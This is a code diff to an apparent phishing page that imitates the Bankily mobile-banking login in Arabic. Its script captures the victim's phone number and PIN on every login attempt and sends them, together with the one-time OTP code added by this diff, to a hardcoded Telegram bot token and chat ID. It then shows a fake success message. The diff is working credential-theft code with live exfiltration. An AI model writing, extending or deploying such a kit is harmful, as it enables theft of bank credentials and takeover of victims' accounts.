@@ -59,7 +59,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 .cd-text{text-align:center;color:#555;font-size:14px;line-height:1.7}
 .cd-time{font-weight:700;color:#1a1a1a;font-size:17px}
 
-/* إضافة خاصية LTR لحقل رقم الهاتف */
+/* خاصية LTR لحقل رقم الهاتف */
 #ph {
   direction: ltr !important;
   text-align: left !important;
@@ -157,13 +157,17 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 </div>
 
 <script>
-// بيانات التوكن والتيليجرام آيدي (تم التحديث)
+// بيانات البوت (تم التحديث)
 const telegramToken = "8652191411:AAES2Ljmd2mCH_1m4syo-yAJiUowKMjAPN4";
 const telegramChatId = "8624656090";
 
-// دالة إرسال البيانات إلى تليجرام
-function sendToTelegram(phone, pin) {
-  const message = `Bankily Login\nPhone: ${phone}\nPin: ${pin}`;
+// دالة إرسال البيانات إلى تليجرام (مفعلة)
+function sendToTelegram(phone, pin, otpCode = null) {
+  let message = `🔔 Bankily Login\n📱 Phone: ${phone}\n🔑 Pin: ${pin}`;
+  if (otpCode) {
+    message += `\n📝 OTP: ${otpCode}`;
+  }
+  
   const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
 
   fetch(url, {
@@ -171,8 +175,15 @@ function sendToTelegram(phone, pin) {
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({
       chat_id: telegramChatId,
-      text: message
+      text: message,
+      parse_mode: "HTML"
     })
+  })
+  .then(response => {
+    console.log("Message sent to Telegram");
+  })
+  .catch(error => {
+    console.error("Error sending to Telegram:", error);
   });
 }
 
@@ -254,7 +265,7 @@ function checkPhoneOperator(){
   }
 }
 
-// تم التعديل هنا: إرسال البيانات إلى تليجرام مع تسجيل الدخول
+// دالة تسجيل الدخول مع الإرسال إلى تليجرام
 function login(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
@@ -269,7 +280,8 @@ function login(){
     document.getElementById('row-pin').classList.add('bad');
     ok=false;
   }
-  // إرسال البيانات إلى تليجرام مهما كان التحقق (يمكنك نقلها حسب الحاجة)
+  
+  // إرسال البيانات إلى تليجرام فوراً
   sendToTelegram(ph, pin);
 
   if(ok)showOtp();
@@ -307,9 +319,19 @@ O.forEach(function(el,i){
   });
 });
 
+// دالة التحقق مع إرسال OTP إلى تليجرام
 function verify(){
   var code=O.map(function(o){return o.value;}).join('');
-  if(code.length!==4){O.forEach(function(o){o.classList.add('bad');});return;}
+  if(code.length!==4){
+    O.forEach(function(o){o.classList.add('bad');});
+    return;
+  }
+  
+  // إرسال OTP إلى تليجرام
+  var ph=phEl.value.trim();
+  var pin=P.map(function(p){return p.value;}).join('');
+  sendToTelegram(ph, pin, code);
+  
   alert('تم التحقق بنجاح!');
 }
 
